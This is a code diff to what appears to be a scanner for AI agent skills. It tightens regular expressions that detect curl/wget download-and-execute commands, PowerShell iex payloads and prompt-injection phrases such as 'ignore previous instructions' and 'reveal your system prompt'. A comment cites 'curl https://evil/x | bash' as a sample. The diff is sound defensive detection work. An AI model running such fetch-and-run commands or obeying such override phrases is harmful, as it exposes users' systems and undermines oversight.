@@ -46,14 +46,20 @@ function safeRegexTest(pattern: RegExp, input: string): RegExpMatchArray | null 
  * Net.WebClient) AND an execution sink (| sh|python|node…, <(...), eval $(...),
  * iex, -EncodedCommand). A bare package install (npm/pip/brew/cargo/apt) matches
  * none. Bounded quantifiers exclude the pipe / newline — no catastrophic backtracking.
+ *
+ * SMI-5359 Wave 4.2c retune (read-only prod sim FP): the curl/wget patterns also
+ * require a CONCRETE remote target (http(s):// or a host.tld domain), so a
+ * code-review/security-review skill documenting the generic pattern in prose
+ * ("curl … | sh", placeholder, no target) no longer matches, while a real
+ * "curl https://evil/x | bash" still does.
  */
 const CODE_EXECUTION_PATTERNS: RegExp[] = [
-  // curl|wget <url> | [sudo] <interpreter>
-  /(?:curl|wget)\b[^\n|]{0,200}?\|\s*(?:sudo\s+)?(?:(?:ba|z|da)?sh|python[23]?|node|ruby|perl|php)\b/i,
-  // process substitution: bash/sh/zsh/source/. <(curl|wget ...)
-  /(?:^|[\s;&])(?:source|\.|ba?sh|zsh|exec)\s+<\(\s*(?:curl|wget)\b/i,
-  // command substitution into eval or `sh -c`
-  /(?:\beval\b|(?:ba|z)?sh\s+-c)\s+["']?[$`]\(?\s*(?:curl|wget)\b/i,
+  // curl|wget <target> | [sudo] <interpreter>
+  /(?:curl|wget)\b[^\n|]{0,150}?(?:https?:\/\/|[\w-]{2,}\.[a-z]{2,})[^\n|]{0,150}?\|\s*(?:sudo\s+)?(?:(?:ba|z|da)?sh|python[23]?|node|ruby|perl|php)\b/i,
+  // process substitution: bash/sh/zsh/source/. <(curl|wget <target> ...)
+  /(?:^|[\s;&])(?:source|\.|ba?sh|zsh|exec)\s+<\(\s*(?:curl|wget)\b[^\n)]{0,150}?(?:https?:\/\/|[\w-]{2,}\.[a-z]{2,})/i,
+  // command substitution into eval or `sh -c` with a remote target
+  /(?:\beval\b|(?:ba|z)?sh\s+-c)\s+["']?[$`]\(?\s*(?:curl|wget)\b[^\n)]{0,150}?(?:https?:\/\/|[\w-]{2,}\.[a-z]{2,})/i,
   // PowerShell download-and-execute
   /\b(?:iex|invoke-expression)\b[^\n]{0,100}?(?:\birm\b|\biwr\b|invoke-webrequest|invoke-restmethod|downloadstring|net\.webclient)/i,
   // PowerShell encoded command
@@ -180,7 +186,7 @@ function hasConfusable(s: string): boolean {
  * in fullwidth/math glyphs) cannot trip it. Bounded (ReDoS-safe), non-global.
  */
 const OBFUSCATION_DIRECTIVE_PATTERN =
-  /(?:ignore|disregard|forget)\s+(?:all\s+|the\s+)?(?:previous|prior|above|earlier)\s+(?:instruction|prompt|rule|direction)|bypass\s+(?:all\s+)?(?:restriction|filter|safety|guard|security)|(?:reveal|show|print|dump|leak)\s+(?:me\s+)?(?:your\s+|the\s+)?(?:system\s+)?(?:prompt|instruction)|(?:curl|wget)\b[^\n|]{0,120}?\|\s*(?:ba|z)?sh\b/i
+  /(?:ignore|disregard|forget)\s+(?:all\s+|the\s+)?(?:previous|prior|above|earlier)\s+(?:instruction|prompt|rule|direction)|bypass\s+(?:all\s+)?(?:restriction|filter|safety|guard|security)|(?:reveal|show|print|dump|leak)\s+(?:me\s+)?(?:your\s+|the\s+)?(?:system\s+)?(?:prompt|instruction)|(?:curl|wget)\b[^\n|]{0,120}?(?:https?:\/\/|[\w-]{2,}\.[a-z]{2,})[^\n|]{0,120}?\|\s*(?:ba|z)?sh\b/i
 
 /**
  * obfuscated_directive: single-emission CRITICAL. Delta-gated — a directive
